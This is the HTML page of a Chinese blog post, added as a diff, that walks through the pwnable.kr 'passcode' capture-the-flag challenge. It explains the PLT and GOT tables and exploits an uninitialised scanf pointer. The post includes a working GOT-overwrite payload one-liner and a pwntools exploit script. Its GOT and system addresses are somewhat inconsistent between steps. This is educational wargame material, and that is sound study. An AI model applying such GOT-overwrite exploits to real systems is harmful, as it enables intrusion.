@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>Pwnable - Passcode 详解 | V1NKe的心情垃圾桶</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="PWN,Linux,Pwnable,Passcode," />
+  
+
+  <meta name="description" content="Pwnable">
+<meta name="keywords" content="PWN,BIN,Linux">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwnable - Passcode 详解">
+<meta property="og:url" content="http://yoursite.com/2018/04/13/Pwnable.kr - Passcode/index.html">
+<meta property="og:site_name" content="V1NKe的心情垃圾桶">
+<meta property="og:description" content="Pwnable">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/Pwnable.kr%20-%20Passcode/1.png">
+<meta property="og:image" content="http://yoursite.com/Pwnable.kr%20-%20Passcode/2.png">
+<meta property="og:updated_time" content="2018-05-02T13:01:27.849Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Pwnable - Passcode 详解">
+<meta name="twitter:description" content="Pwnable">
+<meta name="twitter:image" content="http://yoursite.com/Pwnable.kr%20-%20Passcode/1.png">
+
+  
+
+  
+    <link rel="icon" href="/haimian.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwnable-Passcode-详解"><span class="toc-text">Pwnable - Passcode 详解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GOT覆写技术："><span class="toc-text">GOT覆写技术：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#测试偏移量："><span class="toc-text">测试偏移量：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#覆写GOT表："><span class="toc-text">覆写GOT表：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#构造PalyLoad："><span class="toc-text">构造PalyLoad：</span></a></li></ol></li></ol></li></ol></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-Pwnable.kr - Passcode" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">Pwnable - Passcode 详解</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2018.04.13</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>V1NKe</span>
+        </span>
+      
+
+      
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h1 id="Pwnable-Passcode-详解"><a href="#Pwnable-Passcode-详解" class="headerlink" title="Pwnable - Passcode 详解"></a>Pwnable - Passcode 详解</h1><blockquote>
+<p>Mommy told me to make a passcode based login system.<br>My initial C code was compiled without any error!<br>Well, there was some compiler warning, but who cares about that?</p>
+<p>ssh <a href="mailto:passcode@pwnable.kr" target="_blank" rel="noopener">passcode@pwnable.kr</a> -p2222 (pw:guest)</p>
+</blockquote>
+<p>原理：简单的GOT溢出攻击，scanf没有加上’&amp;’</p>
+<p>知识点：PLT，GOT表的了解</p>
+<p><strong>GOT表：</strong></p>
+<p><strong>概念</strong>:每一个<strong>外部定义的符号</strong>在全局偏移表（<em>Global offset Table</em>）中有相应的条目，GOT位于ELF的<strong>数据段</strong>中，叫做GOT段。</p>
+<p><strong>作用</strong>：把位置无关的地址计算重定位到一个绝对地址。程序首次调用某个库函数时，运行时连接编辑器（<code>rtld</code>）找到相应的符号，并将它重定位到GOT之后每次调用这个函数都会将控制权直接转向那个位置，而不再调用<code>rtld</code>。</p>
+<hr>
+<p><strong>PLT表：</strong></p>
+<p>过程连接表(<em>Procedure Linkage Table</em>)，一个PLT条目对应一个GOT条目</p>
+<p>当<code>main()</code>函数开始，会请求plt中这个函数的对应GOT地址，如果第一次调用那么GOT会重定位到plt，并向栈中压入一个偏移，程序的执行回到<code>_init()</code>函数，<code>rtld</code>得以调用就可以定位<code>printf</code>的符号地址，第二次运行程序再次调用这个函数时程序跳入plt，对应的GOT入口点就是真实的函数入口地址。</p>
+<p>动态连接器并不会把动态库函数在编译的时候就包含到ELF文件中,仅仅是在这个ELF被加载的时候,才会把那些动态函库数代码加载进来,之前系统只会在ELF文件中的GOT中保留一个调用地址.</p>
+<hr>
+<h3 id="GOT覆写技术："><a href="#GOT覆写技术：" class="headerlink" title="GOT覆写技术："></a>GOT覆写技术：</h3><p><strong>原理</strong>：由于GOT表是可写的，把其中的函数地址覆盖为我们shellcode地址，在程序进行调用这个函数时就会执行shellcode。</p>
+<p>上述来源于：<a href="http://jing0107.lofter.com/post/1cbc869f_8b3d8a5" target="_blank" rel="noopener">http://jing0107.lofter.com/post/1cbc869f_8b3d8a5</a></p>
+<hr>
+<p>简单来说，就是每个函数需要调用的时候先是从PLT表之中去寻找该函数入口地址的指针，调用一个函数，控制权将由PLT传递。然后从GOT表中去寻找该函数的地址，GOT表中有相应各个函数的地址，由于PLT表是<strong>只读的</strong>，但是GOT表是<strong>可读的</strong>。</p>
+<p>PLT —&gt; 函数地址指针 ，GOT —&gt; 函数地址。</p>
+<p>###题目源码：</p>
+<blockquote>
+<p>/#include &lt;stdio.h&gt;</p>
+<p>/#include &lt;stdlib.h&gt;</p>
+<p>void login(){<br>    int passcode1;<br>    int passcode2;</p>
+<p>​    printf(“enter passcode1 : “);<br>    scanf(“%d”, passcode1);<br>    fflush(stdin);</p>
+<p>​    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)<br>    printf(“enter passcode2 : “);<br>        scanf(“%d”, passcode2);</p>
+<p>​    printf(“checking…\n”);<br>    if(passcode1==338150 &amp;&amp; passcode2==13371337){<br>                printf(“Login OK!\n”);<br>                system(“/bin/cat flag”);<br>        }<br>        else{<br>                printf(“Login Failed!\n”);<br>        exit(0);<br>        }<br>}</p>
+<p>void welcome(){<br>    char name[100];<br>    printf(“enter you name : “);<br>    scanf(“%100s”, name);<br>    printf(“Welcome %s!\n”, name);<br>}</p>
+<p>int main(){<br>    printf(“Toddler’s Secure Login System 1.0 beta.\n”);</p>
+<p>​    welcome();<br>    login();</p>
+<p>​    // something after login…<br>    printf(“Now I can safely trust you that you have credential :)\n”);<br>    return 0;<br>}</p>
+</blockquote>
+<p>仔细查看之后发现main函数中没有什么可以利用的，关键点在于login()函数中的scanf中，没有加’&amp;’取地址符号。</p>
+<blockquote>
+<p>如果<code>scanf</code>没加<code>&amp;</code>的话，程序会默认从栈中读取<code>4</code>个字节的数据当做<code>scanf</code>取的地址。</p>
+</blockquote>
+<blockquote>
+<p>在 passcode1 前没有加取地址符号 &amp;，而由于 passcode 1没有初始化，导致这个输入操作会将数据写入 栈中 passcode1 未被初始化时存放的数据指向的地址。</p>
+</blockquote>
+<p>所以我们可以利用这里来进行<strong>GOT表覆写</strong>攻击。</p>
+<h4 id="测试偏移量："><a href="#测试偏移量：" class="headerlink" title="测试偏移量："></a>测试偏移量：</h4><p>方法1: 查看name地址和passcode1地址，两地址相减(此题中welcome函数和login函数共用同一个ebp)</p>
+<p>方法2:welcome函数调用时先输入100个’a’，再查看执行到passcode1的scanf前中断查看栈中的情况，可以看出，welcome 函数中输入的最后 4 字节占据了此时局部变量 passcode1 在栈中的位置。所以在执行 <code>scanf(&quot;%d&quot;, passcode1);</code> 时会像这里指向的不存在的 0x61616161 处写内容，故而报错。</p>
+<p>造成这个偏移量的原因有两点：</p>
+<ul>
+<li>在 welcome 函数返回后这里进行了堆栈平衡，然而没有清空栈中的内容，login 函数和 welcome 函数又相当于是共享了同一个栈区域；</li>
+<li>passcode1 没有初始化，导致passcode1 在栈中单元里存放的仍是之前栈帧遗留下来的内容。</li>
+</ul>
+<h4 id="覆写GOT表："><a href="#覆写GOT表：" class="headerlink" title="覆写GOT表："></a>覆写GOT表：</h4><p>这里可以选用scanf函数之后的各个函数来进行覆写，我们选用printf。</p>
+<p>1.查找system指令的地址</p>
+<blockquote>
+<p>passcode@ubuntu:~$ objdump -d passcode</p>
+</blockquote>
+<p><img src="/Pwnable.kr - Passcode/1.png" alt="1"></p>
+<p>可以看到system函数地址为0x080485ea。</p>
+<p>2.查看printf在GOT表中的地址</p>
+<blockquote>
+<pre><code>1. readelf -r target_elf
+2. objdump -R target_elf
+</code></pre></blockquote>
+<p>得到printf 在 GOT 中地址为 0x0804a000。</p>
+<h4 id="构造PalyLoad："><a href="#构造PalyLoad：" class="headerlink" title="构造PalyLoad："></a>构造PalyLoad：</h4><p>因为scanf的时候这里用的是%d所以要把system的地址转换成十进制</p>
+<p>所以：</p>
+<blockquote>
+<p> payload = ‘a’*96 +‘\x00\xa0\x04\x08’+’\n’+’134514147\n’</p>
+</blockquote>
+<p>1.直接Python运行(Python大法好)</p>
+<blockquote>
+<p>python -c ‘print “a”*96 + “\x00\xa0\x04\x08” + “134514147\n”‘ | ./passcode</p>
+</blockquote>
+<p>2.编写exp</p>
+<blockquote>
+<p>from pwn import *</p>
+<p>target = process(‘/home/passcode/passcode’)</p>
+<p>fflush_got = 0x0804a004</p>
+<p>system_addr = 0x80485e3</p>
+<p>payload = “A” * 96 + p32(fflush_got) + str(system_addr)</p>
+<p>target.send(payload)</p>
+<p>target.interactive()</p>
+</blockquote>
+<p>3.结果</p>
+<p><img src="/Pwnable.kr - Passcode/2.png" alt="2"></p>
+<p>4.原理流程</p>
+<blockquote>
+<p>welcome 中 scanf 函数被调用 –&gt; 输入构造好的字符串，其中最后 4 字节为要覆写的保存有目标函数指令地址的内存单元在 GOT 中的地址 –&gt; login 中的 scanf函数被调用 –&gt; 覆写该位置，即目标函数指令地址被改写，执行该函数时会去到改写后的位置执行。</p>
+</blockquote>
+
+    
+  </div>
+
+  
+      <div class="git"></div>
+  
+
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持v1nke</div>
+        <ul>
+        
+          <li class="item">
+            <span>微信扫一扫</span>
+            <img src="/images/qr-wechat.jpeg" alt="">
+          </li>
+        
+          <li class="item">
+            <span>支付宝扫一扫</span>
+            <img src="/images/qr-wechat.jpeg" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2018/03/13/Pwnable-UAF/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2018/04/20/CISCC挑战赛PWN/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+    
+
+    
+    
+
+    
+
+    
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
